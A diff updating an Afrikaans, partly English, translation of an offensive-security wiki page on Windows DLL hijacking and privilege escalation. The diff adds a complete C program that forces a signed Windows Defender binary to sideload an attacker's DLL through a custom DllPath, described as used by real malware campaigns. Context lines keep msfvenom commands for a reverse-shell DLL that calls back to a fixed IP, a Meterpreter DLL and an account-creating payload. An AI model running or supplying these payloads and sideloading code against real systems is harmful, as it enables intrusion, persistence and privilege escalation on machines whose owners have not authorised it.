@@ -4,123 +4,215 @@
 
 
 
-## Basic Information
+## Basiese Inligting
 
-DLL Hijacking behels die manipulasie van 'n vertroude toepassing om 'n kwaadwillige DLL te laai. Hierdie term sluit verskeie taktieke in soos **DLL Spoofing, Injection, en Side-Loading**. Dit word hoofsaaklik gebruik vir kode-uitvoering, om volharding te bereik, en, minder algemeen, privaatheidsverhoging. Ten spyte van die fokus op verhoging hier, bly die metode van hijacking konsekwent oor doelwitte.
+DLL Hijacking behels die manipulasie van 'n vertroude toepassingsprogramme om 'n kwaadwillige DLL te laai. Hierdie term dek verskeie taktieke soos **DLL Spoofing, Injection, and Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, om persistentie te bereik, en minder gereeld vir privilege escalation. Alhoewel die fokus hier op escalation is, bly die metode van hijacking konstant oor die verskillende doelwitte.
 
-### Common Techniques
+### Algemene Tegnieke
 
-Verskeie metodes word gebruik vir DLL hijacking, elk met sy doeltreffendheid afhangende van die toepassing se DLL-laai strategie:
+Verskeie metodes word gebruik vir DLL hijacking, en elkeen se doeltreffendheid hang af van die toepassing se DLL laai-strategie:
 
-1. **DLL Replacement**: Om 'n egte DLL met 'n kwaadwillige een te vervang, opsioneel met DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
-2. **DLL Search Order Hijacking**: Om die kwaadwillige DLL in 'n soekpad voor die wettige een te plaas, wat die toepassing se soekpatroon benut.
-3. **Phantom DLL Hijacking**: Om 'n kwaadwillige DLL te skep vir 'n toepassing om te laai, dink dat dit 'n nie-bestaande vereiste DLL is.
-4. **DLL Redirection**: Om soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers te wysig om die toepassing na die kwaadwillige DLL te lei.
-5. **WinSxS DLL Replacement**: Om die wettige DLL met 'n kwaadwillige teenhanger in die WinSxS-gids te vervang, 'n metode wat dikwels geassosieer word met DLL side-loading.
-6. **Relative Path DLL Hijacking**: Om die kwaadwillige DLL in 'n gebruiker-beheerde gids saam met die gekopieerde toepassing te plaas, wat lyk soos Binary Proxy Execution tegnieke.
+1. **DLL Replacement**: Ruil 'n egte DLL vir 'n kwaadwillige een, opsioneel deur DLL Proxying te gebruik om die oorspronklike DLL se funksionaliteit te bewaar.
+2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in 'n soekpad wat voor die legitiméne een kom, en benut die toepassing se soekpatroon.
+3. **Phantom DLL Hijacking**: Skep 'n kwaadwillige DLL wat 'n toepassing sal laai omdat dit dink dit is 'n vereiste DLL wat nie bestaan nie.
+4. **DLL Redirection**: Wysig soekparameters soos %PATH% of .exe.manifest / .exe.local lêers om die toepassing na die kwaadwillige DLL te lei.
+5. **WinSxS DLL Replacement**: Vervang die legitiméne DLL met 'n kwaadwillige teenvoeter in die WinSxS gids, 'n metode dikwels geassosieer met DLL side-loading.
+6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in 'n gebruikerbeheerde gids saam met 'n gekopieerde toepassing, wat ooreenstem met Binary Proxy Execution tegnieke.
 
-## Finding missing Dlls
+## Vind ontbrekende Dlls
 
-Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind, is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te loop, **die volgende 2 filters in te stel**:
+Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te laat loop en die **volgende 2 filters** te **stel**:
 
 ![](<../../images/image (311).png>)
 
 ![](<../../images/image (313).png>)
 
-en net die **File System Activity** te wys:
+en wys net die **File System Activity**:
 
 ![](<../../images/image (314).png>)
 
-As jy op soek is na **ontbrekende dlls in die algemeen**, moet jy dit **vir 'n paar sekondes** laat loop.\
-As jy op soek is na 'n **ontbrekende dll binne 'n spesifieke uitvoerbare**, moet jy **'n ander filter soos "Process Name" "contains" "\<exec name>" instel, dit uitvoer, en stop om gebeurtenisse te vang**.
+As jy op soek is na **ontbrekende dlls in die algemeen** laat jy dit hierdie proses vir 'n **paar sekondes** loop.\
+As jy op soek is na 'n **ontbrekende dll binne 'n spesifieke uitvoerbare lêer** moet jy 'n ander filter stel soos "Process Name" "contains" "\<exec name>", voer dit uit, en stop die gebeurtenisse wat vasgelê word.
 
-## Exploiting Missing Dlls
+## Exploiteer ontbrekende Dlls
 
-Om privaathede te verhoog, is die beste kans wat ons het om **'n dll te skryf wat 'n privaatheidsproses sal probeer laai** in een van **die plekke waar dit gesoek gaan word**. Daarom sal ons in staat wees om **'n dll te skryf in 'n **gids** waar die **dll voor** die gids waar die **oorspronklike dll** is gesoek word (weird geval), of ons sal in staat wees om **in 'n gids te skryf waar die dll gesoek gaan word** en die oorspronklike **dll nie in enige gids bestaan** nie.
+Om privaatheid te eskaleer is die beste kans wat ons het om 'n **dll te skryf wat 'n privilegie-proses sal probeer laai** in een van die **plekke waar dit gaan gesoek word**. Dus sal ons in staat wees om 'n dll te **skryf** in 'n **map** waar die **dll gesoek word voordat** die gids waar die **oorspronklike dll** is (skaars geval), of ons sal in staat wees om te **skryf in 'n map waar die dll gesoek gaan word** en die oorspronklike **dll nie in enige gids bestaan nie**.
 
 ### Dll Search Order
 
-**Binne die** [**Microsoft dokumentasie**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek gelaai word.**
+**In die** [**Microsoft dokumentasie**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek gelaai word.**
 
-**Windows toepassings** soek na DLLs deur 'n stel **vooraf gedefinieerde soekpade** te volg, wat aan 'n spesifieke volgorde voldoen. Die probleem van DLL hijacking ontstaan wanneer 'n skadelike DLL strategies in een van hierdie gidse geplaas word, wat verseker dat dit gelaai word voordat die egte DLL. 'n Oplossing om dit te voorkom, is om te verseker dat die toepassing absolute pades gebruik wanneer dit na die DLLs verwys wat dit benodig.
+Windows-toepassings soek na DLLs deur 'n stel voorafbepaalde soekpade te volg, in 'n bepaalde volgorde. Die probleem van DLL hijacking ontstaan wanneer 'n kwaadwillige DLL strategies in een van hierdie gidse geplaas word, wat verseker dat dit gelaai word voordat die egte DLL. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paaie gebruik wanneer dit na die DLLs verwys wat dit benodig.
 
-Jy kan die **DLL soekorde op 32-bit** stelsels hieronder sien:
+Jy kan die **DLL search order op 32-bit** stelsels hieronder sien:
 
-1. Die gids waaruit die toepassing gelaai is.
-2. Die stelseldirectory. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funksie om die pad van hierdie gids te kry.(_C:\Windows\System32_)
-3. Die 16-bit stelseldirectory. Daar is geen funksie wat die pad van hierdie gids verkry nie, maar dit word gesoek. (_C:\Windows\System_)
-4. Die Windows-gids. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funksie om die pad van hierdie gids te kry.
+1. The directory from which the application loaded.
+2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
+3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
+4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
 1. (_C:\Windows_)
-5. Die huidige gids.
-6. Die gidse wat in die PATH omgewing veranderlike gelys is. Let daarop dat dit nie die per-toepassing pad insluit wat deur die **App Paths** register sleutel gespesifiseer is nie. Die **App Paths** sleutel word nie gebruik wanneer die DLL soekpad bereken word nie.
+5. The current directory.
+6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.
 
-Dit is die **standaard** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, styg die huidige gids na die tweede plek. Om hierdie kenmerk te deaktiveer, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (standaard is geaktiveer).
+Dit is die **verstek** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, beweeg die huidige gids na die tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (verstek is geaktiveer).
 
-As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** aangeroep word, begin die soek in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.
+As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** aangeroep word, begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.
 
-Laastens, let daarop dat **'n dll gelaai kan word wat die absolute pad aandui in plaas van net die naam**. In daardie geval sal daardie dll **slegs in daardie pad gesoek word** (as die dll enige afhanklikhede het, sal hulle gesoek word soos net gelaai deur naam).
+Laastens, neem kennis dat **'n dll gelaai kan word deur die absolute pad aan te dui in plaas van net die naam**. In daardie geval sal daardie dll **slegs in daardie pad gesoek word** (as die dll enige afhanklikhede het, sal hulle gesoek word soos net gelaai deur naam).
 
 Daar is ander maniere om die soekorde te verander, maar ek gaan dit nie hier verduidelik nie.
 
+### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath
+
+'n Gesofistikeerde manier om deterministies die DLL soekpad van 'n nuut geskepte proses te beïnvloed is om die DllPath veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer jy die proses met ntdll se native APIs skep. Deur 'n aanvaller-beheerde gids hier te verskaf, kan 'n teikenproses wat 'n geïmporteerde DLL per naam oplos (geen absolute pad en nie die veilige laaivlagte gebruik nie) gedwing word om 'n kwaadwillige DLL van daardie gids te laai.
+
+Sleutelidee
+- Bou die process parameters met RtlCreateProcessParametersEx en verskaf 'n pasgemaakte DllPath wat na jou beheer-gids wys (bv. die gids waar jou dropper/unpacker leef).
+- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binary 'n DLL per naam oplos, sal die loader hierdie verskafte DllPath raadpleeg tydens resolusie, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie saam met die teiken EXE geplaas is nie.
+
+Aantekeninge/beperkings
+- Dit beïnvloed die kindproses wat geskep word; dit is anders as SetDllDirectory, wat slegs die huidige proses beïnvloed.
+- Die teiken moet 'n DLL invoer of LoadLibrary per naam gebruik (geen absolute pad en nie LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories gebruik nie).
+- KnownDLLs en hardgekodeerde absolute paaie kan nie gehijack word nie. Forwarded exports en SxS kan prioriteit verander.
+
+Minimale C-voorbeeld (ntdll, wide strings, vereenvoudigde foutbehandeling):
+```c
+#include <windows.h>
+#include <winternl.h>
+#pragma comment(lib, "ntdll.lib")
+
+// Prototype (not in winternl.h in older SDKs)
+typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
+PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
+PUNICODE_STRING ImagePathName,
+PUNICODE_STRING DllPath,
+PUNICODE_STRING CurrentDirectory,
+PUNICODE_STRING CommandLine,
+PVOID Environment,
+PUNICODE_STRING WindowTitle,
+PUNICODE_STRING DesktopInfo,
+PUNICODE_STRING ShellInfo,
+PUNICODE_STRING RuntimeData,
+ULONG Flags
+);
+
+typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
+PUNICODE_STRING NtImagePathName,
+ULONG Attributes,
+PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
+PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
+PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
+HANDLE ParentProcess,
+BOOLEAN InheritHandles,
+HANDLE DebugPort,
+HANDLE ExceptionPort,
+PRTL_USER_PROCESS_INFORMATION ProcessInformation
+);
+
+static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
+DWORD n = GetModuleFileNameW(h, out, cch);
+for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
+}
+
+int wmain(void) {
+// Target Microsoft-signed, DLL-hijackable binary (example)
+const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";
+
+// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
+wchar_t dllDir[MAX_PATH];
+DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);
+
+UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
+RtlInitUnicodeString(&uImage, image);
+RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
+RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
+RtlInitUnicodeString(&uCurDir, dllDir);
+
+RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
+(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
+RtlCreateUserProcess_t pRtlCreateUserProcess =
+(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");
+
+RTL_USER_PROCESS_PARAMETERS *pp = NULL;
+NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
+NULL, NULL, NULL, NULL, NULL, 0);
+if (st < 0) return 1;
+
+RTL_USER_PROCESS_INFORMATION pi = {0};
+st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
+if (st < 0) return 1;
+
+// Resume main thread etc. if created suspended (not shown here)
+return 0;
+}
+```
+Operational usage example
+- Plaas 'n kwaadwillige xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
+- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.
+
+This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.
+
+
 #### Exceptions on dll search order from Windows docs
 
-Sekere uitsonderings op die standaard DLL soekorde word in Windows dokumentasie opgemerk:
+Certain exceptions to the standard DLL search order are noted in Windows documentation:
 
-- Wanneer 'n **DLL wat sy naam met een wat reeds in geheue gelaai is, deel**, die stelsel omseil die gewone soek. In plaas daarvan, voer dit 'n kontrole vir herleiding en 'n manifest uit voordat dit na die DLL wat reeds in geheue is, terugkeer. **In hierdie scenario, voer die stelsel nie 'n soek vir die DLL uit nie**.
-- In gevalle waar die DLL erken word as 'n **kenner DLL** vir die huidige Windows weergawe, sal die stelsel sy weergawe van die bekende DLL gebruik, saam met enige van sy afhanklike DLLs, **en die soekproses oorslaan**. Die register sleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** hou 'n lys van hierdie bekende DLLs.
-- As 'n **DLL afhanklikhede het**, word die soek na hierdie afhanklike DLLs uitgevoer asof hulle slegs deur hul **module name** aangedui is, ongeag of die aanvanklike DLL deur 'n volle pad geïdentifiseer is.
+- Wanneer 'n **DLL wat dieselfde naam deel as een wat reeds in geheue gelaai is** teëgekom word, omseil die stelsel die gewone soektog. In plaas daarvan voer dit 'n kontrole vir redirection en 'n manifest uit voordat dit standaard terugval op die DLL wat reeds in geheue is. **In hierdie scenario voer die stelsel nie 'n soektog vir die DLL uit nie**.
+- In gevalle waar die DLL as 'n **known DLL** vir die huidige Windows-weergawe herken word, sal die stelsel sy weergawe van die known DLL gebruik, saam met enige van sy afhanklike DLLs, **sonder die soekproses**. Die register sleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat 'n lys van hierdie known DLLs.
+- As 'n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLLs uitgevoer asof hulle slegs deur hul **module names** aangedui is, ongeag of die aanvanklike DLL via 'n volle pad geïdentifiseer is.
 
 ### Escalating Privileges
 
-**Requirements**:
+**Vereistes**:
 
-- Identifiseer 'n proses wat onder **verskillende privaathede** (horisontale of laterale beweging) werk of sal werk, wat **'n DLL** ontbreek.
-- Verseker **skrywe toegang** is beskikbaar vir enige **gids** waarin die **DLL** gesoek gaan word. Hierdie plek kan die gids van die uitvoerbare wees of 'n gids binne die stelselpaaie.
+- Identifiseer 'n proses wat werk of gaan werk onder **verskillende voorregte** (horizontal or lateral movement), wat **nie 'n DLL het nie**.
+- Verseker dat **write access** beskikbaar is vir enige **directory** waarin die **DLL** gaan wees wat **gesoek word**. Hierdie ligging kan die gids van die uitvoerbare lêer wees of 'n gids binne die system path.
 
-Ja, die vereistes is ingewikkeld om te vind aangesien **dit per default 'n bietjie vreemd is om 'n bevoorregte uitvoerbare te vind wat 'n dll ontbreek** en dit is selfs **meer vreemd om skrywe toestemmings op 'n stelselpaaie gids te hê** (jy kan nie per default nie). Maar, in verkeerd geconfigureerde omgewings is dit moontlik.\
-In die geval dat jy gelukkig is en jy voldoen aan die vereistes, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Alhoewel die **hooffokus van die projek is om UAC te omseil**, kan jy daar 'n **PoC** van 'n Dll hijaking vir die Windows weergawe vind wat jy kan gebruik (waarskynlik net die pad van die gids waar jy skrywe toestemmings het verander).
+Ja, die vereistes is moeilik om te vind want **per verstek is dit redelik vreemd om 'n geprivilegieerde uitvoerbare lêer te vind wat 'n dll ontbreek** en dit is selfs **meer vreemd om write permissions op 'n system path folder te hê** (jy het dit nie standaard nie). Maar, in verkeerd gekonfigureerde omgewings is dit moontlik.\
+In die geval dat jy gelukkig is en aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) project nagaan. Selfs al is die **main goal of the project is bypass UAC**, mag jy daar 'n **PoC** van 'n Dll hijaking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die gids waar jy write permissions het te verander).
 
-Let daarop dat jy **jou toestemmings in 'n gids kan nagaan** deur:
+Note that you can **check your permissions in a folder** doing:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-En **kontroleer toestemmings van alle vouers binne PATH**:
+En **kontroleer die toestemmings van alle gidse binne PATH**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-U kan ook die invoere van 'n uitvoerbare lêer en die uitvoere van 'n dll nagaan met:
+Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te verhoog** met toestemmings om in 'n **Stelselpaaie-gids** te skryf, kyk:
+Vir 'n volledige gids oor hoe om **abuse Dll Hijacking to escalate privileges** met toestemming om in 'n **System Path folder** te skryf, sien:
+
 
 {{#ref}}
 dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
 {{#endref}}
 
-### Geoutomatiseerde gereedskap
+### Outomatiese hulpmiddels
 
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal kyk of jy skryftoestemmings op enige gids binne die stelselpaaie het.\
-Ander interessante geoutomatiseerde gereedskap om hierdie kwesbaarheid te ontdek, is **PowerSploit funksies**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._
+[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal kyk of jy skryftoestemmings het op enige gids binne die system PATH.\  
+Ander interessante outomatiese gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._
 
 ### Voorbeeld
 
-In die geval dat jy 'n uitbuitbare scenario vind, is een van die belangrikste dinge om dit suksesvol te benut, om **'n dll te skep wat ten minste al die funksies wat die uitvoerbare sal invoer, uitvoer**. In elk geval, let daarop dat Dll Hijacking handig is om te [verhoog van Medium Integriteitsvlak na Hoë **(om UAC te omseil)**](../authentication-credentials-uac-and-efs.md#uac) of van [**Hoë Integriteit na SYSTEM**](#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** binne hierdie dll hijacking studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-Boonop kan jy in die **volgende afdeling** 'n paar **basiese dll kodes** vind wat nuttig kan wees as **sjablone** of om 'n **dll met nie vereiste funksies ge-exporteer** te skep.
+As jy 'n benutbare scenario vind, is een van die belangrikste dinge om dit suksesvol te benut om **create a dll that exports at least all the functions the executable will import from it**. Let wel dat Dll Hijacking handig kan wees om [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) of van[ **High Integrity to SYSTEM**](#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **how to create a valid dll** in hierdie dll hijacking-studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\  
+Verder, in die **next sectio**n kan jy 'n paar **basic dll codes** vind wat nuttig kan wees as **templates** of om 'n **dll with non required functions exported** te skep.
 
 ## **Skep en kompileer Dlls**
 
 ### **Dll Proxifying**
 
-Basies is 'n **Dll proxy** 'n Dll wat in staat is om **jou kwaadwillige kode uit te voer wanneer dit gelaai word**, maar ook om te **bloot te stel** en **te werk** soos **verwag** deur **alle oproepe na die werklike biblioteek te herlei**.
+Basies is 'n **Dll proxy** 'n Dll wat in staat is om jou kwaadwillige kode uit te voer wanneer dit gelaai word, maar ook om te funksioneer soos verwag deur alle oproepe na die werklike biblioteek deur te stuur.
 
-Met die hulpmiddel [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n uitvoerbare program aandui en die biblioteek kies** wat jy wil proxify en **'n proxified dll genereer** of **die Dll aandui** en **'n proxified dll genereer**.
+Met die hulpmiddel [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik 'n uitvoerbare lêer aandui en die biblioteek kies wat jy wil proxify en 'n proxified dll genereer, of net die Dll aandui en 'n proxified dll genereer.
 
 ### **Meterpreter**
 
-**Kry rev shell (x64):**
+**Get rev shell (x64):**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
@@ -128,13 +220,13 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Skep 'n gebruiker (x86 ek het nie 'n x64 weergawe gesien):**
+**Skep 'n gebruiker (x86 ek het nie 'n x64-weergawe gesien nie):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
-### Jou eie
+### Your own
 
-Let daarop dat in verskeie gevalle die Dll wat jy saamstel **verskeie funksies moet uitvoer** wat deur die slagofferproses gelaai gaan word; as hierdie funksies nie bestaan nie, sal die **binaire nie in staat wees om** hulle te laai nie en die **eksploit sal misluk**.
+Let wel dat in verskeie gevalle die Dll wat jy kompileer verskeie funksies moet **export several functions** wat deur die slagofferproses gelaai gaan word. As hierdie funksies nie bestaan nie, sal die **binary won't be able to load** hulle en sal die **exploit will fail**.
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -220,6 +312,9 @@ return TRUE;
 - [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
 - [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
 
+
+
+- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
 
 
 {{#include ../../banners/hacktricks-training.md}}
